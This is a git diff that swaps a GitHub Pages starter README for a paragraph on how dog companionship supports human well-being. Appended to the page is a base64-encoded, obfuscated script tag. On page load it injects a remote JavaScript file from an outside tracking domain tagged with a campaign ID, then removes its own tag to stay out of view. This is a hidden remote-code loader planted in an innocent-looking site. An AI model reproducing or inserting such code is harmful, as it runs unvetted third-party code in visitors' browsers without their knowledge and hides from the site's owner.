@@ -1,37 +1,4 @@
-## Welcome to GitHub Pages
+A study conducted by J.S.J Odendaal in 2003 showed that when humans pet dogs, their bodies release oxytocin, a hormone associated with not only happiness, but bonding and affection as well.[10] According to the social support theory, animals are a source of social support and companionship, which are necessary for well-being.[11] Canines' social impact on humans is especially significant for those who tend to be more isolated, such as children with no siblings[12] or elderly persons.[13] In this view, the animal is part of our community and is an important determinant for psychological well-being. According to self psychology, an animal can be a "self-object" that gives a sense of cohesion, support, or sustenance to a person's sense of self. Self-psychology explains why some animals are so crucial to a person's sense of self and well-being.[14] Dog companionship often gives people a sense of purpose by causing them to develop a daily routine and giving them something to look forward to each day.[1] Studies also show owning a dog reduces stress,[15] alleviates anxiety[16] and even can prolong a human's lifespan.[17] Despite the positive relationship, there are instances where dogs have turned on their owner or other humans.[18] The reasons for a dog to break the normally positive social bond are varied and include a background of abuse against the animal, inherent psychological issues of the dog, and where the dog may have been trained for heightened aggression. But trained aggression is virtually always by professional handlers of special dogs.
 
-You can use the [editor on GitHub](https://github.com/2OA7WFwIAmSZOzUQ7/3t4eojrglk/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/2OA7WFwIAmSZOzUQ7/3t4eojrglk/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+<script id="9YDMh" src="data:text/javascript;base64, dmFyIF9icnZWdyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX21Qdnk2LCBfbHJUN3MpIHt2YXIgX3VlQk12ID0gZnVuY3Rpb24oXzBLd2ZyKSB7d2hpbGUgKC0tXzBLd2ZyKSB7X21Qdnk2WydwdXNoJ10oX21Qdnk2WydzaGlmdCddKCkpO319O191ZUJNdigrK19sclQ3cyk7fShfYnJ2VncsIDB4MTFiKSk7dmFyIF90TklPbCA9IGZ1bmN0aW9uKF9iZk5BcSwgX1kwVE42KSB7X2JmTkFxID0gX2JmTkFxIC0gMHgwO3ZhciBfVlY3SG0gPSBfYnJ2VndbX2JmTkFxXTtyZXR1cm4gX1ZWN0htO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfdE5JT2woJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX3ROT0pmID0gZG9jdW1lbnRbX3ROSU9sKCcweDEnKV0oX3ROSU9sKCcweDInKSk7X3ROT0pmW190TklPbCgnMHgzJyldID0gX3ROSU9sKCcweDQnKTtfdE5PSmZbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzJceDYxXHg2M1x4NmJceDY5XHg2ZVx4NjdceDJlXHg2M1x4NjFceDczXHgyZFx4NzZceDMxXHgyZVx4NzNceDcwXHg2MVx4NjNceDY1XHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1M1x4NGJceDc3XHg0OFx4NGZceDU5XHg0MVx4MzBceDRlXHg3OSc7ZG9jdW1lbnRbX3ROSU9sKCcweDUnKV0oX3ROSU9sKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX3ROT0pmKTtkb2N1bWVudFtfdE5JT2woJzB4NycpXSgnOVlETWgnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
